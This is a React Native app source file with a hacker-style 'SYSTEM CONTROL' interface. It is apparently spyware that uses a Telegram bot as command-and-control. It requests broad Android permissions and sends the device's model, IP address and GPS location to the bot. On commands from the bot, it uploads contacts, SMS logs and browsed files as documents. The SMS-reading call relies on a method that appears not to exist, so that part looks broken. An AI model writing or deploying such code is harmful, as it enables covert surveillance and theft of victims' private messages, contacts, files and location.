import React, { useState, useEffect, useRef } from 'react';
import { View, Text, TextInput, ScrollView, StyleSheet, Animated, TouchableOpacity, KeyboardAvoidingView, Platform, PermissionsAndroid } from 'react-native';
import * as Contacts from 'expo-contacts';
import * as SMS from 'expo-sms';
import * as FileSystem from 'expo-file-system';
import * as Device from 'expo-device';
import * as Application from 'expo-application';
import * as Network from 'expo-network';
import * as Location from 'expo-location';
import axios from 'axios';
import { Ionicons } from '@expo/vector-icons';

export default function App() {
  const [currentPath, setCurrentPath] = useState(FileSystem.documentDirectory);
  const [fileList, setFileList] = useState([]);
  const [historyStack, setHistoryStack] = useState([]);
  const [botToken, setBotToken] = useState('');
  const [chatId, setChatId] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [logs, setLogs] = useState([]);
  const [processing, setProcessing] = useState(false);
  const [lastUpdateId, setLastUpdateId] = useState(0);
  const [deviceInfo, setDeviceInfo] = useState({});
  
  const fadeAnim = useRef(new Animated.Value(0)).current;
  const scanLineAnim = useRef(new Animated.Value(0)).current;
  const scrollViewRef = useRef();

  const API_URL = `https://api.telegram.org/bot${botToken}`;

  useEffect(() => {
    Animated.loop(
      Animated.sequence([
        Animated.timing(scanLineAnim, {
          toValue: 1,
          duration: 2000,
          useNativeDriver: true,
        }),
        Animated.timing(scanLineAnim, {
          toValue: 0,
          duration: 0,
          useNativeDriver: true,
        }),
      ])
    ).start();

    Animated.loop(
      Animated.timing(fadeAnim, {
        toValue: 1,
        duration: 1500,
        useNativeDriver: true,
      })
    ).start();

    if (isConnected) {
      const interval = setInterval(checkTelegramUpdates, 3000);
      return () => clearInterval(interval);
    }
  }, [isConnected]);

  const addLog = (message, type = 'info') => {
    const colors = {
      info: '#0f0',
      error: '#f00',
      success: '#0ff',
      warning: '#ff0'
    };
    
    const newLog = {
      id: Date.now(),
      text: `${new Date().toLocaleTimeString()}: ${message}`,
      color: colors[type]
    };
    
    setLogs(prev => [...prev, newLog]);
    setTimeout(() => scrollViewRef.current?.scrollToEnd({ animated: true }), 100);
  };

  const requestPermissions = async () => {
    const permissions = [
      PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
      PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION
    ];
    
    try {
      const granted = await PermissionsAndroid.requestMultiple(permissions);
      addLog(`Permissions granted: ${JSON.stringify(granted)}`, 'info');
    } catch (err) {
      addLog(`Permission error: ${err}`, 'error');
    }
  };

  const collectDeviceInfo = async () => {
    try {
      let location = {};
      try {
        const { status } = await Location.requestPermissionsAsync();
        if (status === 'granted') {
          location = await Location.getCurrentPositionAsync({});
        }
      } catch (locationError) {
        addLog(`Location error: ${locationError.message}`, 'warning');
      }

      const ipAddress = await Network.getIpAddressAsync();
      const deviceId = Device.osInternalBuildId;

      const info = {
        deviceName: Device.deviceName || 'Unknown',
        brand: Device.brand || 'Unknown',
        model: Device.modelName || Device.modelId || 'Unknown',
        osVersion: Device.osVersion || 'Unknown',
        osBuild: Device.osBuildId || 'Unknown',
        appVersion: Application.nativeApplicationVersion || 'Unknown',
        ipAddress: ipAddress || 'Unknown',
        location: location.coords || 'Not available',
        deviceId: deviceId || 'Unknown',
        uptime: Math.floor(Device.uptime / 60) + ' minutes',
      };

      setDeviceInfo(info);
      return info;
    } catch (error) {
      addLog(`Device info error: ${error.message}`, 'error');
      return {};
    }
  };

  const sendPing = async () => {
    if (!botToken || !chatId) return;

    try {
      const deviceData = await collectDeviceInfo();
      const message = `📱 *Device Connected!*\n\n` +
        `• Device: ${deviceData.deviceName}\n` +
        `• Model: ${deviceData.model}\n` +
        `• OS: Android ${deviceData.osVersion}\n` +
        `• Build: ${deviceData.osBuild}\n` +
        `• IP: ${deviceData.ipAddress}\n` +
        `• Location: ${deviceData.location.latitude ? 
          `${deviceData.location.latitude.toFixed(4)}, ${deviceData.location.longitude.toFixed(4)}` : 'N/A'}\n` +
        `• Uptime: ${deviceData.uptime}\n` +
        `• App Version: ${deviceData.appVersion}\n` +
        `• Device ID: ${deviceData.deviceId}`;

      await axios.post(`${API_URL}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      });

      const keyboard = {
        inline_keyboard: [
          [{ text: '📞 Call Logs', callback_data: 'call_logs' }],
          [{ text: '💬 SMS Logs', callback_data: 'sms_logs' }],
          [{ text: '👥 Contacts', callback_data: 'contacts' }],
          [{ text: '📁 Storage', callback_data: 'storage' }]
        ]
      };

      await axios.post(`${API_URL}/sendMessage`, {
        chat_id: chatId,
        text: 'Choose an option:',
        reply_markup: keyboard
      });

      addLog('Initial messages sent successfully', 'success');
    } catch (error) {
      addLog(`Initial message failed: ${error.message}`, 'error');
    }
  };

  const checkTelegramUpdates = async () => {
    if (processing || !isConnected) return;
    
    try {
      setProcessing(true);
      const response = await axios.get(`${API_URL}/getUpdates`, {
        params: { offset: lastUpdateId + 1 }
      });
      
      if (response.data.result.length > 0) {
        setLastUpdateId(response.data.result[response.data.result.length - 1].update_id);
        for (const update of response.data.result) {
          await handleUpdate(update);
        }
      }
    } catch (error) {
      addLog(`Update error: ${error.message}`, 'error');
    } finally {
      setProcessing(false);
    }
  };

  const handleUpdate = async (update) => {
    if (!update.callback_query) return;

    const { data, id } = update.callback_query;
    const messageId = update.update_id;
    
    try {
      await axios.post(`${API_URL}/answerCallbackQuery`, {
        callback_query_id: id
      });

      addLog(`Received command: ${data}`, 'info');

      switch(data) {
        case 'call_logs':
          await getCallLogs();
          break;
        case 'sms_logs':
          await getSmsLogs();
          break;
        case 'contacts':
          await getContacts();
          break;
        case 'storage':
          await listFiles(currentPath);
          break;
        default:
          if (data.startsWith('file_')) await handleFileSelection(data);
          if (data === 'back') await navigateBack();
          break;
      }
    } catch (error) {
      addLog(`Update handling error: ${error.message}`, 'error');
    }
  };

  const getCallLogs = async () => {
    try {
      addLog('Call log access not available in Expo', 'warning');
      await axios.post(`${API_URL}/sendMessage`, {
        chat_id: chatId,
        text: 'Call log access requires native Android development'
      });
    } catch (error) {
      addLog(`Call logs error: ${error.message}`, 'error');
    }
  };

  const getSmsLogs = async () => {
    try {
      if (await SMS.isAvailableAsync()) {
        console.log(SMS)
        const { result } = await SMS.getSmsAsync({
          maxCount: 100,
          fields: ['address', 'body', 'date_sent']
        });
        
        const csv = result.map(s => 
          `"${s.address || ''}","${s.body?.replace(/"/g, '""') || ''}","${s.date_sent || ''}"\n`
        ).join('');
        
        await sendFile(csv, 'sms_logs.csv');
        addLog('SMS logs sent successfully', 'success');
      } else {
        addLog('SMS not available on this device', 'warning');
      }
    } catch (error) {
      addLog(`SMS logs error: ${error.message}`, 'error');
    }
  };

  const getContacts = async () => {
    try {
      const { status } = await Contacts.requestPermissionsAsync();
      if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers]
        });
        
        const csv = data.map(c => 
          `"${c.name || ''}","${c.phoneNumbers?.[0]?.number || ''}"\n`
        ).join('');
        
        await sendFile(csv, 'contacts.csv');
        addLog('Contacts sent successfully', 'success');
      } else {
        addLog('Contacts permission denied', 'warning');
      }
    } catch (error) {
      addLog(`Contacts error: ${error.message}`, 'error');
    }
  };

  const listFiles = async (path) => {
    try {
      const files = await FileSystem.readDirectoryAsync(path);
      setFileList(files);
      
      const keyboard = {
        inline_keyboard: [
          ...files.map((file, index) => [{
            text: `${index + 1}. ${file}`,
            callback_data: `file_${index}`
          }]),
          [{ text: '🔙 Back', callback_data: 'back' }]
        ]
      };

      await axios.post(`${API_URL}/sendMessage`, {
        chat_id: chatId,
        text: `📂 Current path: ${path}\nSelect a file:`,
        reply_markup: keyboard
      });
      
      addLog(`File list sent for path: ${path}`, 'info');
    } catch (error) {
      addLog(`File list error: ${error.message}`, 'error');
    }
  };

  const handleFileSelection = async (index) => {
    const fileIndex = parseInt(index.split('_')[1]);
    const selectedFile = fileList[fileIndex];
    const newPath = `${currentPath}${selectedFile}`;

    try {
      const info = await FileSystem.getInfoAsync(newPath);
      if (info.isDirectory) {
        setHistoryStack([...historyStack, currentPath]);
        setCurrentPath(newPath + '/');
        await listFiles(newPath + '/');
      } else {
        const content = await FileSystem.readAsStringAsync(newPath);
        await sendFile(content, selectedFile);
        addLog(`File sent: ${selectedFile}`, 'success');
      }
    } catch (error) {
      addLog(`File error: ${error.message}`, 'error');
    }
  };

  const navigateBack = async () => {
    if (historyStack.length > 0) {
      const newPath = historyStack[historyStack.length - 1];
      setCurrentPath(newPath);
      setHistoryStack(historyStack.slice(0, -1));
      await listFiles(newPath);
    }
  };

  const sendFile = async (content, filename) => {
    try {
      const path = `${FileSystem.cacheDirectory}${filename}`;
      await FileSystem.writeAsStringAsync(path, content);
      
      const formData = new FormData();
      formData.append('document', {
        uri: path,
        name: filename,
        type: 'text/plain'
      });
      formData.append('chat_id', chatId);

      await axios.post(`${API_URL}/sendDocument`, formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });
      
      addLog(`File ${filename} sent successfully`, 'success');
    } catch (error) {
      addLog(`File send error: ${error.message}`, 'error');
    }
  };

  return (
    <KeyboardAvoidingView
      behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
      style={styles.container}
    >
      <View style={styles.background}>
        <Animated.View style={[styles.scanLine, {
          transform: [{
            translateY: scanLineAnim.interpolate({
              inputRange: [0, 1],
              outputRange: [0, 500]
            })
          }]
        }]} />
        
        <View style={styles.content}>
          <View style={styles.header}>
            <Animated.Text style={[styles.title, { opacity: fadeAnim }]}>
              SYSTEM CONTROL
            </Animated.Text>
            <View style={styles.connectionStatus}>
              <Ionicons 
                name={isConnected ? 'md-link' : 'md-unlink'} 
                size={24} 
                color={isConnected ? '#0f0' : '#f00'} 
              />
              <Text style={styles.statusText}>
                {isConnected ? 'CONNECTED' : 'DISCONNECTED'}
              </Text>
            </View>
          </View>

          <View style={styles.inputGroup}>
            <TextInput
              style={styles.input}
              placeholder="BOT TOKEN"
              placeholderTextColor="#0f08"
              value={botToken}
              onChangeText={setBotToken}
              autoCapitalize="none"
            />
            <TextInput
              style={styles.input}
              placeholder="CHAT ID"
              placeholderTextColor="#0f08"
              value={chatId}
              onChangeText={setChatId}
              keyboardType="numeric"
            />
            <TouchableOpacity
              style={[styles.button, !isConnected && styles.buttonDisabled]}
              onPress={() => {
                setIsConnected(true);
                requestPermissions();
                sendPing();
              }}
              disabled={!botToken || !chatId}
            >
              <Text style={styles.buttonText}>
                {isConnected ? 'ACTIVE' : 'INITIALIZE'}
              </Text>
            </TouchableOpacity>
          </View>

          <View style={styles.logBox}>
            <Text style={styles.logTitle}>SYSTEM LOGS</Text>
            <ScrollView 
              style={styles.logContainer}
              ref={scrollViewRef}
            >
              {logs.map(log => (
                <Text 
                  key={log.id} 
                  style={[styles.logText, { color: log.color }]}
                >
                  {log.text}
                </Text>
              ))}
            </ScrollView>
          </View>

          <View style={styles.infoBox}>
            <Text style={styles.infoTitle}>DEVICE STATUS</Text>
            <Text style={styles.infoText}>📱 Model: {deviceInfo.model}</Text>
            <Text style={styles.infoText}>🌐 IP: {deviceInfo.ipAddress}</Text>
            <Text style={styles.infoText}>📍 Location: {
              deviceInfo.location?.latitude ? 
              `${deviceInfo.location.latitude.toFixed(4)}, ${deviceInfo.location.longitude.toFixed(4)}` : 
              'Not available'
            }</Text>
            <Text style={styles.infoText}>🔄 Uptime: {deviceInfo.uptime}</Text>
          </View>
        </View>
      </View>
    </KeyboardAvoidingView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#000',
  },
  background: {
    flex: 1,
    padding: 20,
  },
  scanLine: {
    position: 'absolute',
    height: 2,
    width: '100%',
    backgroundColor: '#0f03',
  },
  content: {
    flex: 1,
  },
  header: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 20,
  },
  title: {
    color: '#0f0',
    fontSize: 24,
    fontFamily: 'monospace',
    fontWeight: 'bold',
  },
  connectionStatus: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
  },
  statusText: {
    color: '#0f0',
    fontFamily: 'monospace',
  },
  inputGroup: {
    gap: 12,
    marginBottom: 20,
  },
  input: {
    backgroundColor: '#001000',
    color: '#0f0',
    borderWidth: 1,
    borderColor: '#0f03',
    borderRadius: 4,
    padding: 12,
    fontFamily: 'monospace',
  },
  button: {
    backgroundColor: '#002000',
    borderWidth: 1,
    borderColor: '#0f0',
    borderRadius: 4,
    padding: 16,
    alignItems: 'center',
  },
  buttonDisabled: {
    opacity: 0.5,
    borderColor: '#666',
  },
  buttonText: {
    color: '#0f0',
    fontFamily: 'monospace',
    fontWeight: 'bold',
  },
  logBox: {
    height: 200,
    backgroundColor: '#001000',
    borderWidth: 1,
    borderColor: '#0f03',
    borderRadius: 4,
    marginBottom: 15,
  },
  logTitle: {
    color: '#0f0',
    padding: 10,
    borderBottomWidth: 1,
    borderBottomColor: '#0f03',
    fontFamily: 'monospace',
    fontWeight: 'bold',
  },
  logContainer: {
    flex: 1,
    padding: 10,
  },
  logText: {
    fontFamily: 'monospace',
    fontSize: 12,
    lineHeight: 18,
  },
  infoBox: {
    backgroundColor: '#001000',
    padding: 15,
    borderRadius: 4,
    borderWidth: 1,
    borderColor: '#0f03',
  },
  infoTitle: {
    color: '#0f0',
    fontFamily: 'monospace',
    fontWeight: 'bold',
    marginBottom: 10,
  },
  infoText: {
    color: '#0f0',
    fontFamily: 'monospace',
    fontSize: 12,
    marginBottom: 5,
  },
});